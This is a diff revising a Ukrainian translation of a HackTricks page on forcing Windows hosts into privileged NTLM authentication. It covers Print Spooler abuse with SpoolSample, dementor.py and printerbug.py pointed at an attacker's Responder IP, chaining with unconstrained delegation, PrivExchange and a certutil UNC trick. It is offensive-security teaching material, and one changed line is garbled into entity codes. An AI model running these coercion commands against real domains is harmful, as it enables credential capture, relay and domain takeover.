@@ -1,25 +1,25 @@
-# Примусова привілейована аутентифікація NTLM
+# Примусова NTLM Привілейована Аутентифікація
 
 {% hint style="success" %}
-Вивчайте та практикуйте AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
-Вивчайте та практикуйте GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+Вивчайте та практикуйте Hacking AWS:<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">\
+Вивчайте та практикуйте Hacking GCP: <img src="../../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
 
 <details>
 
-<summary>Підтримка HackTricks</summary>
+<summary>Підтримати HackTricks</summary>
 
 * Перевірте [**плани підписки**](https://github.com/sponsors/carlospolop)!
-* **Приєднуйтесь до** 💬 [**групи Discord**](https://discord.gg/hRep4RUj7f) або [**групи Telegram**](https://t.me/peass) або **слідкуйте** за нами в **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
-* **Діліться хакерськими трюками, надсилаючи PR до** [**HackTricks**](https://github.com/carlospolop/hacktricks) та [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) репозиторіїв на GitHub.
+* **Приєднуйтесь до** 💬 [**групи Discord**](https://discord.gg/hRep4RUj7f) або [**групи Telegram**](https://t.me/peass) або **слідкуйте** за нами в **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**.**
+* **Діліться хакерськими трюками, подаючи PR до** [**HackTricks**](https://github.com/carlospolop/hacktricks) та [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) репозиторіїв на GitHub.
 
 </details>
 {% endhint %}
 
 ## SharpSystemTriggers
 
-[**SharpSystemTriggers**](https://github.com/cube0x0/SharpSystemTriggers) - це **колекція** **тригерів віддаленої аутентифікації**, написаних на C# з використанням компілятора MIDL для уникнення залежностей від сторонніх розробників.
+[**SharpSystemTriggers**](https://github.com/cube0x0/SharpSystemTriggers) - це **колекція** **триггерів віддаленої аутентифікації**, написаних на C# з використанням компілятора MIDL для уникнення залежностей від сторонніх розробників.
 
-## Зловживання службою Spooler
+## Зловживання Службою Спулера
 
 Якщо служба _**Print Spooler**_ **увімкнена**, ви можете використовувати деякі вже відомі облікові дані AD, щоб **запросити** у серверу друку контролера домену **оновлення** нових друкованих завдань і просто сказати йому **надіслати сповіщення на якусь систему**.\
 Зверніть увагу, що коли принтер надсилає сповіщення на довільні системи, йому потрібно **аутентифікуватися** проти цієї **системи**. Тому зловмисник може змусити службу _**Print Spooler**_ аутентифікуватися проти довільної системи, і служба **використає обліковий запис комп'ютера** в цій аутентифікації.
@@ -30,9 +30,9 @@
 ```bash
 Get-ADComputer -Filter {(OperatingSystem -like "*windows*server*") -and (OperatingSystem -notlike "2016") -and (Enabled -eq "True")} -Properties * | select Name | ft -HideTableHeaders > servers.txt
 ```
-### Finding Spooler services listening
+### Знаходження служб Spooler, що слухають
 
-Використовуючи трохи модифікований @mysmartlogin's (Vincent Le Toux's) [SpoolerScanner](https://github.com/NotMedic/NetNTLMtoSilverTicket), перевірте, чи слухає служба Spooler:
+Використовуючи трохи модифікований @mysmartlogin (Вінсент Ле Ту)'s [SpoolerScanner](https://github.com/NotMedic/NetNTLMtoSilverTicket), перевірте, чи слухає служба Spooler:
 ```bash
 . .\Get-SpoolStatus.ps1
 ForEach ($server in Get-Content servers.txt) {Get-SpoolStatus $server}
@@ -47,14 +47,14 @@ rpcdump.py DOMAIN/USER:PASSWORD@SERVER.DOMAIN.COM | grep MS-RPRN
 ```bash
 SpoolSample.exe <TARGET> <RESPONDERIP>
 ```
-або використовуйте [**dementor.py від 3xocyte**](https://github.com/NotMedic/NetNTLMtoSilverTicket) або [**printerbug.py**](https://github.com/dirkjanm/krbrelayx/blob/master/printerbug.py), якщо ви на Linux
+або використовуйте [**3xocyte's dementor.py**](https://github.com/NotMedic/NetNTLMtoSilverTicket) або [**printerbug.py**](https://github.com/dirkjanm/krbrelayx/blob/master/printerbug.py), якщо ви на Linux
 ```bash
 python dementor.py -d domain -u username -p password <RESPONDERIP> <TARGET>
 printerbug.py 'domain/username:password'@<Printer IP> <RESPONDERIP>
 ```
 ### Поєднання з неконтрольованою делегацією
 
-Якщо зловмисник вже скомпрометував комп'ютер з [неконтрольованою делегацією](unconstrained-delegation.md), зловмисник може **змусити принтер аутентифікуватися на цьому комп'ютері**. Через неконтрольовану делегацію **TGT** облікового запису **комп'ютера принтера** буде **збережено в** **пам'яті** комп'ютера з неконтрольованою делегацією. Оскільки зловмисник вже скомпрометував цей хост, він зможе **отримати цей квиток** і зловживати ним ([Pass the Ticket](pass-the-ticket.md)).
+Якщо зловмисник вже скомпрометував комп'ютер з [неконтрольованою делегацією](unconstrained-delegation.md), зловмисник може **змусити принтер аутентифікуватися на цьому комп'ютері**. Через неконтрольовану делегацію **TGT** облікового запису **комп'ютера принтера** буде **збережено** в **пам'яті** комп'ютера з неконтрольованою делегацією. Оскільки зловмисник вже скомпрометував цей хост, він зможе **отримати цей квиток** і зловживати ним ([Pass the Ticket](pass-the-ticket.md)).
 
 ## RCP Примусова аутентифікація
 
@@ -64,7 +64,7 @@ printerbug.py 'domain/username:password'@<Printer IP> <RESPONDERIP>
 
 Атака `PrivExchange` є наслідком вразливості, виявленої в **функції `PushSubscription` Exchange Server**. Ця функція дозволяє серверу Exchange бути примушеним будь-яким доменним користувачем з поштовою скринькою аутентифікуватися на будь-якому хості, наданому клієнтом, через HTTP.
 
-За замовчуванням **служба Exchange працює як SYSTEM** і має надмірні привілеї (зокрема, вона має **привілеї WriteDacl на домен до 2019 року Cumulative Update**). Цю вразливість можна експлуатувати для дозволу **пересилання інформації до LDAP і, відповідно, витягнення бази даних NTDS домену**. У випадках, коли пересилання до LDAP неможливе, цю вразливість все ще можна використовувати для пересилання та аутентифікації на інших хостах у домені. Успішна експлуатація цієї атаки надає негайний доступ до адміністратора домену з будь-яким аутентифікованим обліковим записом домену.
+За замовчуванням **служба Exchange працює як SYSTEM** і має надмірні привілеї (зокрема, вона має **привілеї WriteDacl на домен до 2019 Cumulative Update**). Цю вразливість можна експлуатувати для дозволу **пересилання інформації до LDAP і, відповідно, витягнення бази даних домену NTDS**. У випадках, коли пересилання до LDAP неможливе, цю вразливість все ще можна використовувати для пересилання та аутентифікації на інших хостах у домені. Успішна експлуатація цієї атаки надає негайний доступ до адміністратора домену з будь-яким аутентифікованим обліковим записом домену.
 
 ## Всередині Windows
 
@@ -116,18 +116,18 @@ certutil.exe -syncwithWU  \\127.0.0.1\share
 ## Злом NTLMv1
 
 Якщо ви можете захопити [виклики NTLMv1, читайте тут, як їх зламати](../ntlm/#ntlmv1-attack).\
-_Пам'ятайте, що для зламу NTLMv1 вам потрібно встановити виклик Responder на "1122334455667788"_
+&#xNAN;_&#x52;ем'ятайте, що для зламу NTLMv1 вам потрібно встановити виклик Responder на "1122334455667788"_
 
 {% hint style="success" %}
-Вчіться та практикуйте Hacking AWS:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
-Вчіться та практикуйте Hacking GCP: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+Вчіться та практикуйте Hacking AWS:<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">\
+Вчіться та практикуйте Hacking GCP: <img src="../../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
 
 <details>
 
 <summary>Підтримати HackTricks</summary>
 
 * Перевірте [**плани підписки**](https://github.com/sponsors/carlospolop)!
-* **Приєднуйтесь до** 💬 [**групи Discord**](https://discord.gg/hRep4RUj7f) або [**групи telegram**](https://t.me/peass) або **слідкуйте** за нами в **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **Приєднуйтесь до** 💬 [**групи Discord**](https://discord.gg/hRep4RUj7f) або [**групи Telegram**](https://t.me/peass) або **слідкуйте** за нами в **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**.**
 * **Діліться хакерськими трюками, надсилаючи PR до** [**HackTricks**](https://github.com/carlospolop/hacktricks) та [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) репозиторіїв на github.
 
 </details>
